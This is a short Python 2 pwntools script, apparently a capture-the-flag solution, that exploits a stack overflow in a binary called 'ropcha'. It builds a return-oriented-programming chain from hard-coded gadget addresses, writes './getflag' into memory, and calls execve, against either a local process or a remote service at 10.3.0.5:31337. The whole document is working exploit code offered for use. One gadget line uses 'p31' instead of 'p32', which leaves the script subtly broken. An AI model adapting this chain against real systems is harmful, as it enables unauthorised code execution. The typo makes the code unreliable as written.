#!/usr/bin/python2
import sys
from pwn import *


str_loc = 0x080f1230
null = p32(0x00000000)
call_code = p32(0x0000000b)

pop_eax = p32(0x080bd8c6)
pop_ebx = p32(0x080481d1)
pop_edx = p32(0x0806f6bb)
pop_edx_ecx_ebx = p32(0x0806f6e1)
mov_ptr_edx_eax = p32(0x08057755)
syscall = p31(0x080499d3)

payload = 'A'*28 \
            + pop_edx + p32(str_loc) \
            + pop_eax + './ge' \
            + mov_ptr_edx_eax \
            + pop_edx + p32(str_loc + 4) \
            + pop_eax + 'tfla' \
            + mov_ptr_edx_eax \
            + pop_edx + p32(str_loc + 8) \
            + pop_eax + 'g\0\0\0' \
            + mov_ptr_edx_eax \
            + pop_eax + call_code \
            + pop_edx_ecx_ebx + null + null + p32(str_loc) \
            + syscall


def main():
    if len(sys.argv) > 1:
        r = remote('10.3.0.5', 31337)
    else:
        r = process("./ropcha")
    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    main()
